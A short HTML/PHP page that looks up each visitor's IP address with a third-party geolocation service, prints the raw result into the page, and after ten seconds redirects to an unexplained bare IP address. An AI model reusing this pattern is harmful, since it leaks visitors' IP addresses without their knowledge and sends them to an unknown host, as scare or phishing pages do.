<html>

  <link rel="stylesheet" type="text/css" href="http://waftrue.comxa.com/style.css">
<meta http-equiv="refresh" content="10;url=http://104.155.47.57/1/" />


<link async href="http://fonts.googleapis.com/css?family=Chau%20Philomene%20One" data-generated="http://enjoycss.com" rel="stylesheet" type="text/css"/>
</html>
<?php
header('Content-Type: text/html');


$clientip = $_SERVER['REMOTE_ADDR'];


$api = file_get_contents("http://freegeoip.net/xml/{$clientip}");


?>
<div class="anaglyph"><?php echo $api; ?></div>
